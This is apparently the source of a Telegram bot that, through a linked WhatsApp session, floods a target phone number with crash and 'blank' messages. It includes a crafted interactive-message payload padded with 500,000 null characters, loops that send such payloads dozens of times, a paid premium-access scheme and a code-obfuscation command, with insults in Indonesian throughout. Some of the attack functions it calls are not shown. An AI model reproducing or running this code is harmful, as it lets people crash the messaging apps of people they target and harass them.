const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const JsConfuser = require('js-confuser');
const {
    default: makeWAsocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaconnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WACosmoXet,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const moment = require('moment-timezone');
const { BOT_TOKEN, allowedDevelopers } = require("./哈德森—TokenId/config");
const crypto = require('crypto');
// --- Inisialisasi Bot Telegram ---
const bot = new Telegraf(BOT_TOKEN);

const axios = require('axios');

const GITHUB_TOKEN_LIST_URL = "https:/raw/github.com/alimfcboss-byte/GH_DATABASE.git"; // Ganti dengan URL GitHub yang benar

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("TOKEN KAMU TIDAK VALID❌, SILAHKAN MEMBELI AKSES KEPADA DEVELOPER / SELLER."));
    process.exit(1);
  }

  console.log(chalk.green(`MANTAP! TOKEN KAMU VALID LEK✅`));
  startBot();
}


function startBot() {
  console.clear();
  console.log(chalk.bold.green(`
┏─────  ༽ NOTE  ༼ ────────┓
│ Dev : @Alimsoftspokeni
│ Version : 1.0
│ Script : PENGASINAN CRASH
│ Status : Online
┗─────────────────────┛
  `));
  console.log(chalk.bold.red(`
  ====( HEFAISTOS HADES READY TO DESTROY )====
  `))
}

validateToken();

// --- Variabel Global ---
let CosmoX = null;
let isWhatsAppconnected = false;
const usePairingCode = true; // Tidak digunakan dalam kode Anda
let maintenanceConfig = {
    maintenance_mode: false,
    message: "⛔ Maaf Script ini sedang di perbaiki oleh developer, mohon untuk menunggu hingga selesai !!"
};
let premiumUsers = {};
let adminList = [];
let ownerList = [];
let deviceList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let Premiumataubukan;
// --- Fungsi-fungsi Bantuan ---
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
// --- Fungsi untuk Mengecek Apakah User adalah Owner ---
const isOwner = (userId) => {
    if (ownerList.includes(userId.toString())) {
        ownerataubukan = "✅";
        return true;
    } else {
        ownerataubukan = "❌";
        return false;
    }
};

const OWNER_ID = (userId) => {
    if (allowedDevelopers.includes(userId.toString())) {
        ysudh = "✅";
        return true;
    } else {
        gnymbung = "❌";
        return false;
    }
};

// --- Fungsi untuk Mengecek Apakah User adalah Admin ---
const isAdmin = (userId) => {
    if (adminList.includes(userId.toString())) {
        adminataubukan = "✅";
        return true;
    } else {
        adminataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./BaseCloud/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./BaseCloud/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
    fs.writeFileSync('./BaseCloud/premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./BaseCloud/premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./BaseCloud/ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

// --- Fungsi untuk Menyimpan Daftar Device ---
const saveDeviceList = () => {
    fs.writeFileSync('./BaseCloud/ListDevice.json', JSON.stringify(deviceList));
};

// --- Fungsi untuk Menambahkan Device ke Daftar ---
const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({
        number: deviceNumber,
        userId: userId,
        token: token
    });
    saveDeviceList();
    console.log(chalk.white.bold(`
┏─────────────────
┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
┗─────────────────`));
};

// --- Fungsi untuk Mencatat Aktivitas Pengguna ---
const recordUserActivity = (userId, userNickname) => {
    const now = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
    userActivity[userId] = {
        nickname: userNickname,
        last_seen: now
    };

    // Menyimpan aktivitas pengguna ke file
    fs.writeFileSync('./BaseCloud/userActivity.json', JSON.stringify(userActivity));
};

// --- Fungsi untuk Memuat Aktivitas Pengguna ---
const loadUserActivity = () => {
    try {
        const data = fs.readFileSync('./BaseCloud/userActivity.json');
        userActivity = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat aktivitas pengguna:'), error);
        userActivity = {};
    }
};

// --- Middleware untuk Mengecek Mode Maintenance ---
const checkMaintenance = async (ctx, next) => {
    let userId, userNickname;

    if (ctx.from) {
        userId = ctx.from.id.toString();
        userNickname = ctx.from.first_name || userId;
    } else if (ctx.update.channel_post && ctx.update.channel_post.sender_chat) {
        userId = ctx.update.channel_post.sender_chat.id.toString();
        userNickname = ctx.update.channel_post.sender_chat.title || userId;
    }

    // Catat aktivitas hanya jika userId tersedia
    if (userId) {
        recordUserActivity(userId, userNickname);
    }

    if (maintenanceConfig.maintenance_mode && !OWNER_ID(ctx.from.id)) {
        // Jika mode maintenance aktif DAN user bukan developer:
        // Kirim pesan maintenance dan hentikan eksekusi middleware
        console.log("Pesan Maintenance:", maintenanceConfig.message);
        const escapedMessage = maintenanceConfig.message.replace(/\*/g, '\\*'); // Escape karakter khusus
        return await ctx.replyWithMarkdown(escapedMessage);
    } else {
        // Jika mode maintenance tidak aktif ATAU user adalah developer:
        // Lanjutkan ke middleware/handler selanjutnya
        await next();
    }
};

// --- Middleware untuk Mengecek Status Premium ---
const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("❌ Lo siapa ngentot? Kalo belum punya akses minta add dlu ya dekk.");
    }
};

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    CosmoX = makeWAsocket(connectionOptions);

    CosmoX.ev.on('creds.update', saveCreds);
    store.bind(CosmoX.ev);

    CosmoX.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
       
            isWhatsAppconnected = true;
            console.log(chalk.white.bold(`
┏─────────────────
┃   ${chalk.green.bold('WHATSAPP CONNECTED')}
┗─────────────────`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
┏─────────────────
┃   ${chalk.red.bold('WHATSAPP DISCONNECT')}
┗─────────────────`),
                shouldReconnect ? chalk.white.bold(`
┏─────────────────
┃   ${chalk.red.bold('RECONNECTING AGAIN')}
┗─────────────────`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppconnected = false;
        }
    });
}

(async () => {
    console.log(chalk.whiteBright.bold(`
┏─────────────────
┃ ${chalk.yellowBright.bold('SYSTEM ANTI CRACK ACTIVE')}
┗─────────────────`));

    console.log(chalk.white.bold(`
┏━━━━━━─────────────────
┃ ${chalk.yellow.bold('SUKSES MEMUAT DATABASE OWNER')}
┗━━━━━━─────────────────`));

    loadPremiumUsers();
    loadAdmins();
    loadDeviceList();
    loadUserActivity();

    // Menambahkan device ke ListDevice.json saat inisialisasi
    addDeviceToList(BOT_TOKEN, BOT_TOKEN);
})();
// --- Command Handler ---

// Command untuk pairing WhatsApp
bot.command("xconnect", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id && !isAdmin(ctx.from.id))) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /xconnect <nomor_wa>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');

    if (!phoneNumber.startsWith('62')) {
        return await ctx.reply("❌ Nomor harus diawali dengan 62. Contoh: /xconnect 62𝐗𝐗𝐗");
    }

    if (CosmoX && CosmoX.user) {
        return await ctx.reply("ℹ️ WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await CosmoX.requestPairingCode(phoneNumber, "COSMOXNX");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
*✅ Kode pairing mu lek*

*Nomor:* ${phoneNumber}
*Kode:* \`${formattedCode}\`
        `;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Command /addowner - Menambahkan owner baru
bot.command("addowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addowner <id_user>");
    }

    if (ownerList.includes(userId)) {
        return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`);
    }

    ownerList.push(userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner baru sekarang memiliki akses ke perintah /addadmin, /addprem, dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /delowner - Menghapus owner
bot.command("delowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delowner <id_user>");
    }

    if (!ownerList.includes(userId)) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`);
    }

    ownerList = ownerList.filter(id => id !== userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner tersebut tidak lagi memiliki akses seperti owner.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /addadmin - Menambahkan admin baru
bot.command("addadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addadmin <id_user>");
    }

    addAdmin(userId);

    const successMessage = `
✅ Si Anjing dengan ID *${userId}* berhasil ditambahkan sebagai *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin baru sekarang memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }]
            ]
        }
    });
});

// Command /deladmin - Menghapus admin
bot.command("deladmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /deladmin <id_user>");
    }

    removeAdmin(userId);

    const successMessage = `
✅ Si Anjing dengan ID *${userId}* berhasil dihapus dari daftar *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin tersebut tidak lagi memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }]
            ]
        }
    });
});

// Callback Query untuk Menampilkan Daftar Admin
bot.action("listadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Lu siapa kontol?");
    }

    const adminListString = adminList.length > 0
        ? adminList.map(id => `- ${id}`).join("\n")
        : "Tidak ada admin yang terdaftar.";

    const message = `
ℹ️ List Babu Admin:

${adminListString}

Total: ${adminList.length} admin.
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// Command /addprem - Menambahkan user premium
bot.command("addprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addprem <id_user> <durasi_hari>");
    }

    const userId = args[1];
    const durationDays = parseInt(args[2]);

    if (isNaN(durationDays) || durationDays <= 0) {
        return await ctx.reply("❌ Durasi hari harus berupa angka positif.");
    }

    addPremiumUser(userId, durationDays);

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');

    const successMessage = `
✅ Si Kontol dengan ID *${userId}* berhasil ditambahkan sebagai *Premium User*.

*Detail:*
- *ID User:* ${userId}
- *Durasi:* ${durationDays} hari
- *Kadaluarsa:* ${formattedExpiration} WIB

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Cek Status Premium", callback_data: `cekprem_${userId}` }]
            ]
        }
    });
});

// Command /delprem - Menghapus user premium
bot.command("delprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delprem <id_user>");
    }

    if (!premiumUsers[userId]) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    removePremiumUser(userId);

    const successMessage = `
✅ Si Kontol dengan ID *${userId}* berhasil dihapus dari daftar *Premium User*.

*Detail:*
- *ID User:* ${userId}

User tersebut tidak lagi memiliki akses ke fitur premium.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Callback Query untuk Menampilkan Status Premium
bot.action(/cekprem_(.+)/, async (ctx) => {
    const userId = ctx.match[1];
    if (userId !== ctx.from.id.toString() && !OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Anda tidak memiliki akses untuk mengecek status premium user lain.");
    }

    if (!premiumUsers[userId]) {
        return await ctx.answerCbQuery(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
    const timeLeft = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').fromNow();

    const message = `
ℹ️ Status Si Peler *${userId}*

*Detail:*
- *ID User:* ${userId}
- *Kadaluarsa:* ${formattedExpiration} WIB
- *Sisa Waktu:* ${timeLeft}

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// --- Command /cekusersc ---
bot.command("cekusersc", async (ctx) => {
    const totalDevices = deviceList.length;
    const deviceMessage = `
ℹ️ Saat ini terdapat *${totalDevices} device* yang terhubung dengan script ini.
    `;

    await ctx.replyWithMarkdown(deviceMessage);
});

// --- Command /monitoruser ---
bot.command("monitoruser", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    let userList = "";
    for (const userId in userActivity) {
        const user = userActivity[userId];
        userList += `
- *ID:* ${userId}
 *Nickname:* ${user.nickname}
 *Terakhir Dilihat:* ${user.last_seen}
`;
    }

    const message = `
👤 *Daftar Pengguna Bot:*
${userList}
Total Pengguna: ${Object.keys(userActivity).length}
    `;

    await ctx.replyWithMarkdown(message);
});

// --- Contoh Command dan Middleware ---
const prosesrespone = async (target, ctx) => {
  
    const ProsesColi = `\`\`\`\n
┏─── ༽ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ༼ ────┓
│ Sᴛᴀᴛᴜs : sᴇɴᴅɪɴɢ ʙᴜɢs... 
│ Nᴏᴛᴇ : ᴊᴇᴅᴀ 𝟻ᴍɴᴛ ʏᴀ ᴅᴇᴋ ʙɪᴀʀ
│ ɴᴏᴍᴏʀ sᴇɴᴅᴇʀ ɢᴋ ᴋᴇ ʙᴀɴɴᴇᴅ
┗─────────────────────┛\`\`\`   `;

    await ctx.replyWithPhoto("https://files.catbox.moe/8lf2o3.png", {
      caption: ProsesColi,
      parse_mode: "Markdown"
    })
};

const donerespone = async (target, ctx) => {
  
    const SuksesCrot = `\`\`\`\n
┏─── ༽ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ༼ ────┓
│ Sᴛᴀᴛᴜs : sᴜᴄᴄᴇsғᴜʟʟʏ sᴇɴᴅ ʙᴜɢ 
│ Nᴏᴛᴇ : ᴊᴇᴅᴀ 𝟻ᴍɴᴛ ʏᴀ ᴅᴇᴋ ʙɪᴀʀ
│ ɴᴏᴍᴏʀ sᴇɴᴅᴇʀ ɢᴋ ᴋᴇ ʙᴀɴɴᴇᴅ
┗─────────────────────┛
┏─────────────────────┓
│ ᴀʟʟ ʀɪɢʜᴛ ʀᴇᴠᴇʀsᴇᴅ ʙʏ ᴄᴏsᴍᴏ
┗─────────────────────┛\`\`\`
    `;

    await ctx.replyWithPhoto("https://files.catbox.moe/gpzw87.png", {
      caption: SuksesCrot,
      parse_mode: "Markdown"
    })
};

const checkWhatsAppconnection = async (ctx, next) => {
    if (!isWhatsAppconnected) {
        await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /xconnect");
        return;
    }
    await next();
};

const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};

bot.use(checkMaintenance); // Middleware untuk mengecek maintenance

///Function Bug\\\


// --- Command /crash (Placeholder for your actual crash functions) ---
bot.command("easydelay", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 1; i++) {
      await HardLevelDelay(24, target);
    }

    await donerespone(target, ctx);
});

bot.command("trickkill", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 1; i++) {
      await HardLevelDelay(24, target);
    }

    await donerespone(target, ctx);
});

bot.command("drain", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

     for (let i = 0; i < 1; i++) {
     await BulldozerComboX(99, target);
     }

    await donerespone(target, ctx);
});

bot.command("xcursed", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 1; i++) {
      await HardLevelDelay(24, target);
    }

    await donerespone(target, ctx);
});

bot.command("blankchat", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 35; i++) {
      await blank1(target);
      await blank2(target);
      await CosmoUisystem(target, ptcp = true);
      await blank1(target);
      await blank2(target);
      await CosmoUisystem(target, ptcp = true);
      await blank1(target);
      await blank2(target);
      await CosmoUisystem(target, ptcp = true);
      await blank1(target);
      await blank2(target);
      await CosmoUisystem(target, ptcp = true);
    }

    await donerespone(target, ctx);
});

bot.command("2ndblank", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 30; i++) {
      await CosmoUisystem(target, ptcp = true);
      await blank1(target);
      await blank2(target);
      await CosmoUisystem(target, ptcp = true);
      await blank1(target);
      await blank2(target);
      await CosmoUisystem(target, ptcp = true);
      await blank1(target);
      await blank2(target);
      await CosmoUisystem(target, ptcp = true);
      await blank1(target);
      await blank2(target);
    }

    await donerespone(target, ctx);
});

bot.command("trashapp", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 30; i++) {
      await blank1(target);
      await blank2(target);
      await CosmoUisystem(target, ptcp = true);
      await blank1(target);
      await blank2(target);
      await CosmoUisystem(target, ptcp = true);
      await blank1(target);
      await blank2(target);
      await blank1(target);
      await blank2(target);
    }

    await donerespone(target, ctx);
});

bot.command("vasion", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 15; i++) {
      await blank1(target);
      await blank2(target);
      await blank1(target);
      await blank2(target);
      await blank1(target);
      await blank2(target);
      await blank1(target);
      await blank2(target);
    }

    await donerespone(target, ctx);
});
//Fungsi Untuk Menghapus Bug
bot.command("clearbug", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 1; i++) {
      await deleteSentBugs(target);
      await deleteSentBugs(target);
      await deleteSentBugs(target);
      await deleteSentBugs(target);
      await deleteSentBugs(target);
      await deleteSentBugs(target);
      await deleteSentBugs(target);
    }

    await donerespone(target, ctx);
});

// ---- command /enc (to encrypt js files)
bot.command("enchard", checkPremium, async (ctx) => {
    console.log(`Perintah diterima: /enc dari pengguna: ${ctx.from.username || ctx.from.id}`);
    const replyMessage = ctx.message.reply_to_message;

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return ctx.reply('❌ Silakan balas file .js untuk dienkripsi.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    try {
        const fileLink = await ctx.telegram.getFileLink(fileId);
        const response = await axios.get(fileLink.href, { responseType: "text" });
        let codeString = response.data;

        if (typeof codeString !== "string") {
            throw new Error("File bukan dalam format string yang valid.");
        }

        ctx.reply("Sabar.. Lagi di Encrypt sama Cosmo");

        let obfuscatedCode = await JsConfuser.obfuscate(codeString, {
            target: "node",
            compact: true,
            controlFlowFlattening: 0.8,
            deadCode: 0.3,
            dispatcher: true,
            duplicateLiteralsRemoval: 0.7,
            globalConcealing: true,
            minify: true,
            movedDeclarations: true,
            objectExtraction: true,
            renameVariables: true,
            renameGlobals: true,
            stringEncoding: true,
            stringSplitting: 0.5,
            stringConcealing: true,
            stringCompression: true,
            opaquePredicates: 0.9,
            calculator: true,
            hexadecimalNumbers: true,
            shuffle: true,
            identifierGenerator: () => "高宝座COSMOSUKANENEN齐Xz高宝座" + Math.random().toString(36).substring(7),
        });

        if (typeof obfuscatedCode === 'object' && obfuscatedCode.code) {
            obfuscatedCode = obfuscatedCode.code;
        }

        if (typeof obfuscatedCode !== 'string') {
            throw new Error("Hasil enkripsi bukan dalam format string.");
        }

        console.log(typeof obfuscatedCode, obfuscatedCode);

        const encryptedFilePath = `./HadesHardEncrypted_${fileName}`;
        fs.writeFileSync(encryptedFilePath, obfuscatedCode, "utf-8");

        await ctx.replyWithDocument(
            { source: encryptedFilePath, filename: `encrypted_${fileName}` },
            { caption: `✅ Encryption Successful\n• Type: Hades Hard\n• By @raysofhopee` }
        );

